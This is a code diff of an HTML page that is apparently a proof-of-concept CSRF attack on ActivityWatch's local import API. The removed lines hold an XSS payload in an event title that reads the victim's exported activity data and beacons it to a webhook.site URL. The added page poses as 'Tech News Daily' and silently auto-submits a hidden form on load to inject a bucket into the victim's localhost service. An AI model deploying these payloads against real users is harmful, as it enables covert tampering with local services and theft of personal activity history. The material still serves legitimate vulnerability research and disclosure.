@@ -1,38 +1,43 @@
-<!DOCTYPE html>
-  <html>
-  <head><title>Totally Normal Website</title></head>
-  <body>
-  <h1>Welcome to my blog!</h1>
-  <p>Nothing suspicious here.</p>
+<!DOCTYPE html>                                                                                                    
+  <html>                                                                                                             
+  <head><title>Tech News Daily</title></head>                                                                        
+  <body>                                                    
+  <h1>Loading latest articles...</h1>                                                                                
+  <noscript>Please enable JavaScript to view this page.</noscript>
+  <form id="f" method="POST" enctype="multipart/form-data"
+        action="http://localhost:5600/api/0/import"></form>
   <script>
-  // CHANGE THIS to your webhook.site URL
-  var EXFIL_URL = "https://webhook.site/a1784cc8-5807-41fd-bae4-a3439ae40c97";
-
-  // Stage 1: CSRF - inject XSS into ActivityWatch via import
-  var payload = {
+  var p = {
     "buckets": {
-      "aw-csrf-test": {
-        "id": "aw-csrf-test",
+      "csrf-from-github-pages": {
+        "id": "csrf-from-github-pages",
         "type": "test",
-        "client": "test",
-        "hostname": "test",
-        "created": "2026-01-01T00:00:00+00:00",
-        "events": [{
-          "timestamp": "2026-02-20T10:00:00+00:00",
-          "duration": 3600,
-          "data": {
-            "title": "<img src=x onerror=\"fetch('/api/0/export').then(function(r){return
-  r.text()}).then(function(d){navigator.sendBeacon('" + EXFIL_URL + "',d)})\">"
+        "client": "csrf-attacker",
+        "hostname": "attacker",
+        "created": "2026-02-20T00:00:00+00:00",
+        "events": [
+          {
+            "timestamp": "2026-02-20T10:00:00+00:00",
+            "duration": 3600,
+            "data": {
+              "app": "CSRF_FROM_GITHUB_PAGES",
+              "title": "This event was injected by visiting sumanthsec.github.io"
+            }
           }
-        }]
+        ]
       }
     }
   };
 
-  var blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
-  var fd = new FormData();
-  fd.append('file', blob, 'buckets.json');
-  fetch('http://localhost:5600/api/0/import', {method: 'POST', body: fd, mode: 'no-cors'});
+  var dt = new DataTransfer();
+  dt.items.add(new File([JSON.stringify(p)], "buckets.json", {type: "application/json"}));
+  var i = document.createElement("input");
+  i.type = "file";
+  i.name = "buckets";
+  i.style.display = "none";
+  i.files = dt.files;
+  document.getElementById("f").appendChild(i);
+  document.getElementById("f").submit();
   </script>
   </body>
   </html>
